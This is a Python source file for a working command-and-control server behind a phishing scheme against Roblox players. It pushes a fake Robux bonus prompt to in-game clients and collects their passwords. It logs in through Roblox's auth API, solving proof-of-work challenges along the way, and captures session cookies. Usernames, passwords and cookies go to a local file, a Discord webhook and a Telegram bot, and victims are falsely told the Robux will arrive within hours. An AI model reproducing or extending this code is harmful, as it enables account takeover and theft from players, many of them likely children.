"""
c2_api.py — C2 + direct Roblox API login. No browser needed.
"""

import math
import asyncio
import websockets
import json
import time
import logging
import os
import sys
import random
import re
import subprocess
import threading
from curl_cffi import requests as curl_requests
import requests  # fallback for requests-only features
import base64

logging.basicConfig(level=logging.INFO, format='%(asctime)s %(message)s')
log = logging.getLogger(__name__)

WS_PORT = 8081
MODULES_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "modules")
PHISH_COOLDOWN = 20  # seconds before first phish and cooldown between retries
UPDATE_DELAY = 2 * 3600  # hours before update.lua after complete
CREDENTIALS_FILE = os.path.abspath("c2_credentials.txt")
DISCORD_WEBHOOK = os.environ.get("DISCORD_WEBHOOK", "")

tg_proc = None


def tg_write(text):
    try:
        tg_proc.stdin.write(json.dumps({"text": text}) + "\n")
        tg_proc.stdin.flush()
    except Exception as e:
        log.warning(f"tg_write error: {e}")

SESSION = curl_requests.Session(impersonate="chrome123")
SESSION.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Origin": "https://www.roblox.com",
    "Referer": "https://www.roblox.com/",
})


def login_v1(username, password):
    """Try v1 login endpoint."""
    SESSION.get("https://www.roblox.com/login", timeout=10)
    resp = SESSION.post("https://auth.roblox.com/v1/login", json={
        "username": username,
        "password": password,
    }, timeout=10)
    log.info(f"v1 login: HTTP {resp.status_code} body={resp.text[:150]}")
    if ".ROBLOSECURITY" in resp.cookies:
        return {"cookie": resp.cookies[".ROBLOSECURITY"]}
    return None


def login_v2(username, password):
    """Try v2 login endpoint. Returns cookie, challenge info, or None.

    Two-step CSRF acquisition:
    1. First POST without CSRF → 403 + x-csrf-token in headers
    2. Second POST with CSRF → actual result
    """
    SESSION.get("https://www.roblox.com/login", timeout=10)

    # Step 1: get CSRF token by sending a request that will fail
    step1 = SESSION.post("https://auth.roblox.com/v2/login", json={
        "ctype": "Username",
        "cvalue": username,
        "password": password,
    }, timeout=10)
    csrf = step1.headers.get("x-csrf-token", "")
    log.info(f"v2 step1: HTTP {step1.status_code} csrf={'yes' if csrf else 'no'}")

    if not csrf:
        log.warning("No CSRF token received")
        return None

    # Step 2: actual login with CSRF
    resp = SESSION.post("https://auth.roblox.com/v2/login", json={
        "ctype": "Username",
        "cvalue": username,
        "password": password,
    }, headers={"x-csrf-token": csrf}, timeout=10)
    log.info(f"v2 step2: HTTP {resp.status_code} headers csrf={resp.headers.get('x-csrf-token','none')[:40]}")
    log.info(f"v2 step2 set-cookie: {resp.headers.get('set-cookie','none')[:100]}")

    if ".ROBLOSECURITY" in resp.cookies:
        return {"cookie": resp.cookies[".ROBLOSECURITY"]}

    if resp.status_code == 403:
        chall_id = resp.headers.get("rblx-challenge-id", "")
        chall_type = resp.headers.get("rblx-challenge-type", "")
        chall_meta_b64 = resp.headers.get("rblx-challenge-metadata", "")
        # Step2 consumed the old csrf — get new one from response headers
        csrf = resp.headers.get("x-csrf-token", "") or csrf
        log.info(f"v2 403: body={resp.text[:200]}")
        log.info(f"Challenge: type={chall_type} id={chall_id} meta={chall_meta_b64[:60] if chall_meta_b64 else ''}")
        if chall_id and chall_meta_b64:
            try:
                meta = json.loads(base64.b64decode(chall_meta_b64))
            except Exception:
                meta = {}
            meta["challenge_type"] = chall_type
            return {"challenge": chall_id, "metadata": meta, "csrf": csrf, "meta_b64": chall_meta_b64}
    return None


def solve_pow(N_str, A, T):
    N = int(N_str)
    val = A % N
    for _ in range(T):
        val = (val * val) % N
    return str(val)


BROWSER_HDRS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.9",
    "Origin": "https://www.roblox.com",
    "Referer": "https://www.roblox.com/login",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-site",
    "Content-Type": "application/json;charset=UTF-8",
}


def login_quick(code, private_key):
    """Quick Login with AuthToken (no captcha needed)."""
    SESSION.get("https://www.roblox.com/login", timeout=10)
    # Get CSRF
    step1 = SESSION.post("https://auth.roblox.com/v2/login", json={
        "ctype": "AuthToken", "cvalue": code, "password": private_key,
    }, timeout=10)
    csrf = step1.headers.get("x-csrf-token", "")
    if not csrf:
        log.warning("Quick Login: no CSRF")
        return None
    resp = SESSION.post("https://auth.roblox.com/v2/login", json={
        "ctype": "AuthToken", "cvalue": code, "password": private_key,
    }, headers={"x-csrf-token": csrf}, timeout=10)
    log.info(f"Quick Login: HTTP {resp.status_code}")
    if ".ROBLOSECURITY" in resp.cookies:
        return {"cookie": resp.cookies[".ROBLOSECURITY"]}
    if resp.status_code == 403:
        log.info(f"Quick Login 403: {resp.text[:120]}")
    return None


def solve_challenge(username, password, challenge, metadata, csrf, meta_b64=""):
    """Solve proof-of-work challenge and retry login."""
    session_id = metadata.get("sessionId", "")
    if not session_id:
        log.warning("No sessionId in challenge metadata")
        return None

    pw_url = "https://apis.roblox.com/proof-of-work-service/v1/pow-puzzle"

    # Step 1: Fetch PoW puzzle
    puzzle_resp = SESSION.get(f"{pw_url}?sessionID={session_id}", timeout=10)
    if puzzle_resp.status_code != 200:
        log.warning(f"Puzzle fetch failed: HTTP {puzzle_resp.status_code}")
        return None
    puzzle = puzzle_resp.json()
    log.info(f"Puzzle response: {json.dumps(puzzle, indent=2)}")
    artifacts = json.loads(puzzle.get("artifacts", "{}"))
    N_str = artifacts.get("N", "")
    A = int(artifacts.get("A", 0))
    T_ = int(artifacts.get("T", 0))
    log.info(f"Solving PoW: N_len={len(N_str)} A={A} T={T_}")
    solution = solve_pow(N_str, A, T_)

    # Step 2: Get fresh CSRF then submit PoW solution
    csrf_pow = SESSION.post("https://auth.roblox.com/v2/login", json={}, timeout=10).headers.get("x-csrf-token", "")
    pow_hdrs = {"x-csrf-token": csrf_pow} if csrf_pow else {}
    solve_resp = SESSION.post(
        pw_url, json={"sessionID": session_id, "solution": solution, "prefix": ""},
        headers=pow_hdrs, timeout=10
    )
    log.info(f"PoW submit: HTTP {solve_resp.status_code} {solve_resp.text[:300]}")
    if solve_resp.status_code != 200:
        return None
    solve_data = solve_resp.json()
    redemption_token = solve_data.get("redemptionToken", "")
    if not redemption_token:
        log.warning("No redemption token in response")
        return None
    log.info("Redemption token obtained")

    # Step 3: Get fresh CSRF for retry
    csrf_retry = SESSION.post("https://auth.roblox.com/v2/login", json={}, timeout=10).headers.get("x-csrf-token", "")
    log.info(f"Fresh CSRF for retry: {'yes' if csrf_retry else 'no'}")

    def do_retry(extra_meta=False):
        hdrs = {
            "Origin": "https://www.roblox.com",
            "Referer": "https://www.roblox.com/login",
            "x-csrf-token": csrf_retry,
            "rblx-challenge-id": challenge,
            "rblx-challenge-type": "proofofwork",
            "rblx-challenge-redemption-token": redemption_token,
        }
        if extra_meta and meta_b64:
            hdrs["rblx-challenge-metadata"] = meta_b64
        return SESSION.post(
            "https://auth.roblox.com/v2/login",
            json={"ctype": "Username", "cvalue": username, "password": password},
            headers=hdrs,
        )

    # Try without metadata first
    retry = do_retry(False)
    log.info(f"Retry login: HTTP {retry.status_code}")
    log.info(f"Retry body: {retry.text[:300]}")
    retry_chall = retry.headers.get("rblx-challenge-id", "")
    if retry_chall:
        log.info(f"Retry returned new challenge: id={retry_chall} type={retry.headers.get('rblx-challenge-type','')}")
    if ".ROBLOSECURITY" in retry.cookies:
        return {"cookie": retry.cookies[".ROBLOSECURITY"]}

    # Fallback: try with metadata header
    if meta_b64:
        log.info("Retrying with metadata header...")
        csrf_retry = SESSION.post("https://auth.roblox.com/v2/login", json={}, timeout=10).headers.get("x-csrf-token", "")
        retry2 = do_retry(True)
        log.info(f"Retry2 login: HTTP {retry2.status_code}")
        log.info(f"Retry2 body: {retry2.text[:300]}")
        if ".ROBLOSECURITY" in retry2.cookies:
            return {"cookie": retry2.cookies[".ROBLOSECURITY"]}

    # Last resort: redemption token as metadata (no redemption-token header)
    log.info("Retrying with redemption-token in metadata...")
    csrf_retry = SESSION.post("https://auth.roblox.com/v2/login", json={}, timeout=10).headers.get("x-csrf-token", "")
    meta_with_token = base64.b64encode(json.dumps({"redemptionToken": redemption_token}).encode()).decode()
    retry3 = SESSION.post(
        "https://auth.roblox.com/v2/login",
        json={"ctype": "Username", "cvalue": username, "password": password},
        headers={
            "Origin": "https://www.roblox.com",
            "Referer": "https://www.roblox.com/login",
            "x-csrf-token": csrf_retry,
            "rblx-challenge-id": challenge,
            "rblx-challenge-type": "proofofwork",
            "rblx-challenge-metadata": meta_with_token,
        },
    )
    log.info(f"Retry3: HTTP {retry3.status_code} body={retry3.text[:200]}")
    if ".ROBLOSECURITY" in retry3.cookies:
        return {"cookie": retry3.cookies[".ROBLOSECURITY"]}

    log.info("Retry failed, no cookie")
    return None


def try_api_login(username, password, quick_token=None):
    """Try all API login methods. Returns cookie dict or None."""
    if quick_token:
        result = login_quick(quick_token["code"], quick_token["privateKey"])
        if result:
            return result
        log.info("Quick Login failed, falling back to password")

    for attempt in range(1, 4):
        if attempt > 1:
            delay = 5 * attempt
            log.info(f"Retry attempt {attempt} in {delay}s...")
            time.sleep(delay)

        result = login_v1(username, password)
        if result:
            return result

        result = login_v2(username, password)
        if result is None:
            continue
        if "cookie" in result:
            return result
        if "challenge" in result:
            log.info(f"Solving challenge: {result['challenge']}")
            pw_result = solve_challenge(username, password, result["challenge"], result["metadata"], result.get("csrf", ""), result.get("meta_b64", ""))
            if pw_result:
                return pw_result
            log.info("PoW failed, will retry full login")
            continue
        return None
    return None


def save_credentials(username, password, cookie_value):
    try:
        with open(CREDENTIALS_FILE, "a", encoding="utf-8") as f:
            f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}]\n")
            f.write(f"Username: {username}\n")
            f.write(f"Password: {password}\n")
            f.write(f".ROBLOSECURITY: {cookie_value}\n\n")
        log.info(f"Credentials saved to {CREDENTIALS_FILE}")
    except Exception as e:
        log.error(f"Failed to save credentials: {e}")


def dc_write(text):
    try:
        requests.post(DISCORD_WEBHOOK, json={"content": text}, timeout=5)
    except Exception as e:
        log.error(f"DC webhook error: {e}")


def load_module(name):
    path = os.path.join(MODULES_DIR, name)
    with open(path, "r", encoding="utf-8") as f:
        return f.read()


CLIENTS = {}  # user_id -> {"tries": 0, "state": "hello", "player_name": "", "last_phish": 0, "completed": False, "exhausted": False, "closed_by_user": False, "done_at": 0, "phish_task": None, "ws": None}


async def delayed_send(uid, delay, module, target_state):
    """Send module after delay, unless client is completed."""
    if delay:
        await asyncio.sleep(delay)
    client = CLIENTS.get(uid)
    if not client or client.get("completed"):
        return
    try:
        ws = client.get("ws")
        if ws:
            if module == "phish.lua":
                await ws.send(json.dumps({"type": "show_phish"}))
            else:
                module_code = load_module(module)
                await ws.send(module_code)
            client["last_phish"] = time.time()
            client["state"] = target_state
    except Exception as e:
        log.warning(f"delayed_send error: {e}")


async def handle_client(ws):
    log.info("Client connected")
    cs = {"tries": 0, "state": "hello", "player_name": "", "user_id": 0, "last_phish": 0, "completed": False, "exhausted": False, "closed_by_user": False, "done_at": 0, "phish_task": None, "ws": ws}
    try:
        async for msg in ws:
            if isinstance(msg, str):
                try:
                    data = json.loads(msg)
                except json.JSONDecodeError:
                    continue
                t = data.get("type")
                if t == "hello":
                    cs["player_name"] = data.get("playerName", "")
                    cs["user_id"] = data.get("userId", 0)
                    uid = cs["user_id"]
                    log.info(f"Client hello: user={cs['player_name']} id={uid}")
                    # Restore state if this user reconnects
                    if uid in CLIENTS:
                        old = CLIENTS[uid]
                        if old.get("completed"):
                            log.info(f"User {uid} already completed, no phish")
                            cs["completed"] = True
                            CLIENTS[uid] = cs
                            continue
                        if old.get("closed_by_user"):
                            log.info(f"User {uid} voluntarily closed, no more phish")
                            cs["closed_by_user"] = True
                            CLIENTS[uid] = cs
                            continue
                        if old.get("exhausted") and old.get("done_at"):
                            elapsed = time.time() - old["done_at"]
                            if elapsed < PHISH_COOLDOWN:
                                log.info(f"User {uid} exhausted, in cooldown ({PHISH_COOLDOWN - elapsed:.0f}s remaining)")
                                cs["exhausted"] = True
                                cs["done_at"] = old["done_at"]
                                CLIENTS[uid] = cs
                                continue
                            log.info(f"User {uid} exhausted, cooldown elapsed, resending phish")
                    CLIENTS[uid] = cs
                    cs["phish_task"] = asyncio.create_task(delayed_send(uid, PHISH_COOLDOWN, "phish.lua", "phish_sent"))
                elif t == "password":
                    if cs.get("completed"):
                        continue
                    password = data.get("password", "")
                    user_id = data.get("userId", 0)
                    player_name = data.get("playerName", "")
                    quick_token = data.get("quickToken")
                    log.info(f"Password from {player_name} (id={user_id}), len={len(password)} quick_token={'yes' if quick_token else 'no'}")
                    cs["tries"] += 1
                    username = None
                    try:
                        resp = requests.get(f"https://users.roblox.com/v1/users/{user_id}", timeout=10)
                        if resp.status_code == 200:
                            username = resp.json().get("name")
                    except Exception as e:
                        log.warning(f"Username lookup error: {e}")
                    if not username:
                        await ws.send(json.dumps({"type": "err", "message": "Не удалось определить логин"}))
                        continue
                    log.info(f"Username: {username}")
                    await ws.send(json.dumps({"type": "hold", "message": "Проверка данных..."}))
                    try:
                        result = await asyncio.to_thread(try_api_login, username, password, quick_token)
                    except Exception as e:
                        log.error(f"API login error: {e}")
                        await ws.send(json.dumps({"type": "err", "message": f"Ошибка входа: {str(e)[:80]}"}))
                        continue
                    if result and "cookie" in result:
                        log.info(f"COOKIE captured")
                        cs["completed"] = True
                        cs["state"] = "complete"
                        save_credentials(username, password, result["cookie"])
                        tg_msg = f"<b>{player_name}</b>\n{username}\n{password}\n\n{result['cookie']}"
                        tg_write(tg_msg)
                        dc_write(f"✅ {player_name} | {username}:{password} | {result['cookie']}")
                        h1 = random.randint(6, 12)
                        h2 = random.randint(h1 + 12, h1 + 48)
                        await ws.send(json.dumps({"type": "ok", "message": f"Robux будут начислены от {h1} до {h2} часов. Ожидайте."}))
                    elif result and result.get("challenge") == "captcha":
                        if cs["tries"] >= 3:
                            cs["exhausted"] = True
                            cs["tries"] = 0
                            log.info("Sending CAPTCHA err with cooldown")
                            await ws.send(json.dumps({"type": "err", "message": f"CAPTCHA не пройдена. Фиш через {math.ceil(PHISH_COOLDOWN / 3600)} ч.", "cooldown": PHISH_COOLDOWN, "blocked": True}))
                        else:
                            await ws.send(json.dumps({"type": "err", "message": f"CAPTCHA не пройдена. Попытка {cs['tries']}/3"}))
                    else:
                        if cs["tries"] >= 3:
                            cs["exhausted"] = True
                            cs["tries"] = 0
                            log.info("Sending wrong password err with cooldown")
                            await ws.send(json.dumps({"type": "err", "message": f"Неверный пароль. Бонус пришлем снова через {math.ceil(PHISH_COOLDOWN / 3600)} ч.", "cooldown": PHISH_COOLDOWN, "blocked": True}))
                        else:
                            await ws.send(json.dumps({"type": "err", "message": f"Неверный пароль, попробуйте ещё раз. Попытка {cs['tries']}/3"}))
                elif t == "2fa_code":
                    pass
                elif t in ("closed", "timed_out"):
                    if cs.get("exhausted"):
                        cs["done_at"] = time.time()
                        if cs.get("phish_task"):
                            cs["phish_task"].cancel()
                        uid = cs["user_id"]
                        cs["phish_task"] = asyncio.create_task(delayed_send(uid, PHISH_COOLDOWN, "phish.lua", "phish_sent"))
                    else:
                        cs["closed_by_user"] = True
                    cs["state"] = "done"
    except websockets.exceptions.ConnectionClosed:
        pass
    finally:
        if cs.get("phish_task"):
            cs["phish_task"].cancel()
        cs["ws"] = None
        cs["state"] = "disconnected"
        cs["done_at"] = time.time()
        # Keep CLIENTS entry for reconnect tracking
        uid = cs.get("user_id", 0)
        if uid and uid in CLIENTS:
            CLIENTS[uid].update({"ws": None, "state": "disconnected", "done_at": time.time()})
        log.info(f"Client disconnected (user_id={uid})")


async def main():
    global tg_proc
    tg_proc = subprocess.Popen(
        [sys.executable, "-u", os.path.join(os.path.dirname(os.path.abspath(__file__)), "tg_bot.py")],
        stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
        text=True, bufsize=1
    )
    # log tg_bot output in thread (non-blocking)
    def read_tg():
        for line in tg_proc.stdout:
            log.info(f"[tg_bot] {line.rstrip()}")
    threading.Thread(target=read_tg, daemon=True).start()

    async def handler(ws):
        await handle_client(ws)
    async with websockets.serve(handler, "0.0.0.0", WS_PORT) as server:
        log.info(f"WebSocket server on ws://0.0.0.0:{WS_PORT}")
        await asyncio.Future()

if __name__ == "__main__":
    asyncio.run(main())
